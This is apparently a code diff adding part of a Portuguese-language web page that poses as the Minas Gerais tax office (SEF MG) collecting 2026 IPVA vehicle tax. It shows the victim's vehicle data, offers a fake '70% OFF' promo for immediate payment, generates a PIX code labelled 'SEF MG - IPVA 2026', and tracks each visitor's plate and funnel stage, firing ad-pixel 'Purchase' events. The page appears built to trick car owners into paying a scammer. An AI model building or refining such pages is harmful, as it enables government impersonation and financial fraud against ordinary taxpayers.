+                        d="M306.4 356.5C311.8 351.1 321.1 351.1 326.5 356.5L403.5 433.5C417.7 447.7 436.6 455.5 456.6 455.5L471.7 455.5L374.6 552.6C344.3 582.1 295.1 582.1 264.8 552.6L167.3 455.2L176.6 455.2C196.6 455.2 215.5 447.4 229.7 433.2L306.4 356.5zM326.5 282.9C320.1 288.4 311.9 288.5 306.4 282.9L229.7 206.2C215.5 191.1 196.6 184.2 176.6 184.2L167.3 184.2L264.7 86.8C295.1 56.5 344.3 56.5 374.6 86.8L471.8 183.9L456.6 183.9C436.6 183.9 417.7 191.7 403.5 205.9L326.5 282.9zM176.6 206.7C190.4 206.7 203.1 212.3 213.7 222.1L290.4 298.8C297.6 305.1 307 309.6 316.5 309.6C325.9 309.6 335.3 305.1 342.5 298.8L419.5 221.8C429.3 212.1 442.8 206.5 456.6 206.5L494.3 206.5L552.6 264.8C582.9 295.1 582.9 344.3 552.6 374.6L494.3 432.9L456.6 432.9C442.8 432.9 429.3 427.3 419.5 417.5L342.5 340.5C328.6 326.6 304.3 326.6 290.4 340.6L213.7 417.2C203.1 427 190.4 432.6 176.6 432.6L144.8 432.6L86.8 374.6C56.5 344.3 56.5 295.1 86.8 264.8L144.8 206.7L176.6 206.7z">
+                    </path>
+                </svg>
+            </div>
+
+            <h3 style="text-align: center; color: #2c3e50; margin-bottom: 8px; font-size: 20px; font-weight: 700;">
+                Pagamento via PIX</h3>
+            <p style="font-size: 12px; color:#7f8c8d; text-align: center; margin-bottom: 20px;">Pague de forma rápida e
+                segura</p>
+
+            <!-- Instructions -->
+            <div
+                style="background: #f8f9fa; padding: 12px 15px; border-radius: 8px; margin-bottom: 18px; border-left: 3px solid #32BCAD;">
+                <p style="font-size: 12px; color: #2c3e50; margin-bottom: 10px; font-weight: 600;">Como pagar:</p>
+                <div style="display: flex; flex-direction: column; gap: 10px;">
+                    <!-- Step 1 -->
+                    <div style="display: flex; align-items: flex-start; gap: 10px;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#32BCAD" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round" style="flex-shrink: 0; margin-top: 2px;">
+                            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                            <line x1="12" y1="18" x2="12.01" y2="18"></line>
+                        </svg>
+                        <span style="font-size: 11px; color: #555; line-height: 1.5;">Abra o aplicativo do seu
+                            banco</span>
+                    </div>
+                    <!-- Step 2 -->
+                    <div style="display: flex; align-items: flex-start; gap: 10px;">
+                        <svg width="20" height="20" viewBox="0 0 640 640" fill="#32BCAD"
+                            style="flex-shrink: 0; margin-top: 2px;">
+                            <path
+                                d="M306.4 356.5C311.8 351.1 321.1 351.1 326.5 356.5L403.5 433.5C417.7 447.7 436.6 455.5 456.6 455.5L471.7 455.5L374.6 552.6C344.3 582.1 295.1 582.1 264.8 552.6L167.3 455.2L176.6 455.2C196.6 455.2 215.5 447.4 229.7 433.2L306.4 356.5zM326.5 282.9C320.1 288.4 311.9 288.5 306.4 282.9L229.7 206.2C215.5 191.1 196.6 184.2 176.6 184.2L167.3 184.2L264.7 86.8C295.1 56.5 344.3 56.5 374.6 86.8L471.8 183.9L456.6 183.9C436.6 183.9 417.7 191.7 403.5 205.9L326.5 282.9zM176.6 206.7C190.4 206.7 203.1 212.3 213.7 222.1L290.4 298.8C297.6 305.1 307 309.6 316.5 309.6C325.9 309.6 335.3 305.1 342.5 298.8L419.5 221.8C429.3 212.1 442.8 206.5 456.6 206.5L494.3 206.5L552.6 264.8C582.9 295.1 582.9 344.3 552.6 374.6L494.3 432.9L456.6 432.9C442.8 432.9 429.3 427.3 419.5 417.5L342.5 340.5C328.6 326.6 304.3 326.6 290.4 340.6L213.7 417.2C203.1 427 190.4 432.6 176.6 432.6L144.8 432.6L86.8 374.6C56.5 344.3 56.5 295.1 86.8 264.8L144.8 206.7L176.6 206.7z">
+                            </path>
+                        </svg>
+                        <span style="font-size: 11px; color: #555; line-height: 1.5;">Escolha a opção <strong>Pagar com
+                                PIX</strong></span>
+                    </div>
+                    <!-- Step 3 -->
+                    <div style="display: flex; align-items: flex-start; gap: 10px;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#32BCAD" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round" style="flex-shrink: 0; margin-top: 2px;">
+                            <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                            <rect x="7" y="7" width="3" height="3"></rect>
+                            <rect x="14" y="7" width="3" height="3"></rect>
+                            <rect x="7" y="14" width="3" height="3"></rect>
+                            <rect x="14" y="14" width="3" height="3"></rect>
+                        </svg>
+                        <span style="font-size: 11px; color: #555; line-height: 1.5;">Escaneie o QR Code
+                            <strong>OU</strong> copie o código</span>
+                    </div>
+                    <!-- Step 4 -->
+                    <div style="display: flex; align-items: flex-start; gap: 10px;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#32BCAD" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round" style="flex-shrink: 0; margin-top: 2px;">
+                            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                            <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                        </svg>
+                        <span style="font-size: 11px; color: #555; line-height: 1.5;">Confirme o pagamento</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- QR Code -->
+            <div style="text-align: center; margin-bottom: 20px;">
+                <p style="font-size: 13px; color: #555; margin-bottom: 12px; font-weight: 600;">Escaneie o QR Code:</p>
+                <div id="qrCodeContainer" class="qr-code-container"
+                    style="display: inline-block; padding: 15px; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                </div>
+            </div>
+
+            <!-- Copy Code Section -->
+            <div style="margin-bottom: 20px;">
+                <p style="font-size: 13px; color: #555; margin-bottom: 8px; font-weight: 600;">Ou copie o código PIX:
+                </p>
+                <textarea id="pixPasteArea" class="copy-paste-box" readonly
+                    style="width: 100%; padding: 12px; border: 2px solid #e0e6ed; border-radius: 6px; font-family: monospace; font-size: 11px; resize: none; height: 80px; background: #f8f9fa;"></textarea>
+            </div>
+
+            <button class="btn-copy-pix" onclick="copyPix()"
+                style="width: 100%; background: #28a745; color: white; padding: 14px; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px;"
+                onmouseover="this.style.background='#218838'" onmouseout="this.style.background='#28a745'">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+                COPIAR CÓDIGO PIX
+            </button>
+
+            <p style="font-size: 11px; color: #999; text-align: center; margin-top: 15px;">
+                ⏱️ O código PIX é válido e pode ser pago a qualquer momento
+            </p>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay"
+        style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;">
+        <div
+            style="background: white; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3);">
+            <div
+                style="width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #32BCAD; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px;">
+            </div>
+            <p style="color: #2c3e50; font-size: 14px; font-weight: 600;">Gerando código PIX...</p>
+            <p style="color: #7f8c8d; font-size: 12px; margin-top: 5px;">Aguarde um momento</p>
+        </div>
+    </div>
+
+    <style>
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .promo-modal-content.pix-modal-content {
+                max-width: 95% !important;
+                margin: 10px;
+                padding: 20px !important;
+            }
+        }
+    </style>
+
+    <!-- INITIAL PROMO MODAL -->
+    <div id="promoLoadModal" class="promo-modal-overlay">
+        <div class="promo-modal-content"
+            style="max-width: 90%; width: 500px; text-align: center; padding: 0; overflow: hidden;">
+            <img src="promo.png" alt="Promoção Bom Pagador - 70% OFF"
+                style="width: 100%; height: auto; display: block;">
+
+            <div style="padding: 25px 30px;">
+                <p style="color: #555; margin-bottom: 20px; font-size: 14px;">
+                    Aproveite o desconto exclusivo para regularização imediata.
+                </p>
+                <button class="btn-modal-action"
+                    onclick="document.getElementById('promoLoadModal').style.display='none'">
+                    APROVEITAR DESCONTO
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- QR Code Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <script>
+        // Modal & Utils
+        function closePixModal() { document.getElementById('pixModal').style.display = 'none'; }
+
+        function copyPix() {
+            const copyText = document.getElementById("pixPasteArea");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value);
+
+            // Get session_id from stored data
+            const data = JSON.parse(sessionStorage.getItem('vehicleData'));
+            const session_id = data?.session_id;
+
+            // Track PIX copy
+            if (session_id) {
+                fetch('/api/track_pix_copy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: session_id })
+                }).catch(e => console.error('Track error:', e));
+            }
+
+            // Fire Meta Pixel Purchase event
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'Purchase', { currency: 'BRL' });
+            }
+
+            alert("Código Pix copiado!");
+        }
+
+        async function generatePix() {
+            const data = JSON.parse(sessionStorage.getItem('vehicleData'));
+            const amount = data.raw_first_payment_total;
+
+            if (!amount) { alert("Erro ao calcular valor."); return; }
+
+            // Fire Meta Pixel InitiateCheckout event
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'InitiateCheckout', { currency: 'BRL', value: amount });
+            }
+
+            // Show loading
+            document.getElementById('loadingOverlay').style.display = 'flex';
+
+            try {
+                // Start both the API call and 3-second timer
+                const [result] = await Promise.all([
+                    fetch('/api/generate_pix', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            amount: amount,
+                            plate: data.plate,
+                            name: "SEF MG - IPVA 2026",
+                            city: data.city || "BELO HORIZONTE"
+                        })
+                    }).then(res => res.json()),
+                    new Promise(resolve => setTimeout(resolve, 3000)) // 3-second minimum delay
+                ]);
+
+                // Hide loading after both complete
+                document.getElementById('loadingOverlay').style.display = 'none';
+
+                if (result.error) {
+                    alert('Erro Pix: ' + result.error);
+                } else {
+                    // Show modal
+                    document.getElementById('pixModal').style.display = 'flex';
+
+                    // Track stage 3: PIX modal
+                    const sessionId = data.session_id || sessionStorage.getItem('session_id');
+                    if (sessionId) {
+                        fetch('/api/track_session', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                session_id: sessionId,
+                                stage: 'pix_modal',
+                                plate: data.plate
+                            })
+                        }).catch(e => console.error('Track error:', e));
+                    }
+
+                    document.getElementById('pixPasteArea').value = result.payload;
+                    document.getElementById('qrCodeContainer').innerHTML = "";
+                    new QRCode(document.getElementById('qrCodeContainer'), {
+                        text: result.payload,
+                        width: 180,
+                        height: 180
+                    });
+                }
+            } catch (e) {
+                // Hide loading
+                document.getElementById('loadingOverlay').style.display = 'none';
+                alert("Erro de conexão: " + e.message);
+            }
+        }
+
+        window.onload = function () {
+            const data = JSON.parse(sessionStorage.getItem('vehicleData'));
+            if (!data) {
+                alert("Nenhum dado encontrado. Redirecionando...");
+                window.location.href = 'index.html';
+                return;
+            }
+
+            // Track stage 2: Viewing results
+            const sessionId = data.session_id || sessionStorage.getItem('session_id');
+            if (sessionId) {
+                fetch('/api/track_session', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: sessionId,
+                        stage: 'viewing_results',
+                        plate: data.plate
+                    })
+                }).catch(e => console.error('Track error:', e));
+            }
+
+            // Populate page with data
+            // SHOW PROMO MODAL ON LOAD
+            document.getElementById('promoLoadModal').style.display = 'flex';
+
+            // Populate Fields
+            document.getElementById('resUF').textContent = data.state || "MG";
+            document.getElementById('resModelo').textContent = data.brand || "...";
+            document.getElementById('resPlaca').textContent = data.plate;
+            document.getElementById('resMuni').textContent = data.city || "---";
+            document.getElementById('resRenavam').textContent = data.renavam;
+            document.getElementById('resChassi').textContent = data.chassis;
+            document.getElementById('resMotor').textContent = data.engine;
+
+            // Dynamic Dates - installments are 1 month apart
+            const today = new Date();
+            const date1 = new Date(today); // 1st installment = today
+            const date2 = new Date(today); date2.setMonth(today.getMonth() + 1); // 2nd = 1 month later
+            const date3 = new Date(today); date3.setMonth(today.getMonth() + 2); // 3rd = 2 months later
+            const date4 = new Date(today); date4.setMonth(today.getMonth() + 3); // 4th = 3 months later
+            const fmtDate = (d) => d.toLocaleDateString('pt-BR');
+
+            // Values (FIXED: Single Installment + Ticket)
+            const valIpvaSingle = parseFloat(data.raw_installment_val) || 0;
+            const valLic = parseFloat(data.raw_licensing_val) || 0;
+            const totalPayNow = (valIpvaSingle + valLic).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+            // Populate Summary Table (bottom section)
+            document.getElementById('resIpvaVal').textContent = valIpvaSingle.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+            document.getElementById('resLicVal').textContent = valLic.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+            // Populate total in fixed bottom bar
+            document.getElementById('totalStickyBar').textContent = totalPayNow;
+
+            document.getElementById('resTotalDetail').textContent = totalPayNow;
+            document.getElementById('valAgreement').textContent = data.installment_val;
+            document.getElementById('valLicensing').textContent = data.licensing_val;
+            document.getElementById('valParcela1').textContent = data.installment_val;
+            document.getElementById('valParcela3').textContent = data.installment_val;
+            document.getElementById('valParcela4').textContent = data.installment_val;
+
+            // Populate installment dates
+            document.getElementById('labelDate1').textContent = fmtDate(date1);
+            document.getElementById('labelDate2').textContent = fmtDate(date2);
+            document.getElementById('labelDate3').textContent = fmtDate(date3);
+            document.getElementById('labelDate4').textContent = fmtDate(date4);
+
+            // Simple price display: original vs discounted (70% OFF)
+            const originalPriceValue = data.ipva_full || '0'; // Use formatted value from backend
+            // Calculate total IPVA with 70% discount (30% of original)
+            const originalPriceNumeric = parseFloat(originalPriceValue.replace('R$', '').replace(/\./g, '').replace(',', '.').trim()) || 0;
+            const totalIpvaWith70Discount = originalPriceNumeric * 0.30; // 70% OFF = pay 30%
+
+            document.getElementById('originalPrice').textContent = originalPriceValue;
+            document.getElementById('discountedPrice').textContent = totalIpvaWith70Discount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }); // Total IPVA with discount, not single installment
+
+            // document.getElementById('totalSelected').textContent = data.first_payment_total; // Removed OLD logic ID
+
+            const now = new Date();
+            document.getElementById('headerDate').textContent = now.toLocaleDateString('pt-BR');
+            document.getElementById('headerTime').textContent = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+            document.getElementById('headerRenavam').textContent = data.renavam;
+
+            // Populate Promo Warning (bottom gray)
+            document.getElementById('promoDeadlineDate2').textContent = now.toLocaleDateString('pt-BR');
+            document.getElementById('fullPriceValue2').textContent = data.ipva_full;
+
+
+        };
+    </script>
+</body>
+
+</html>
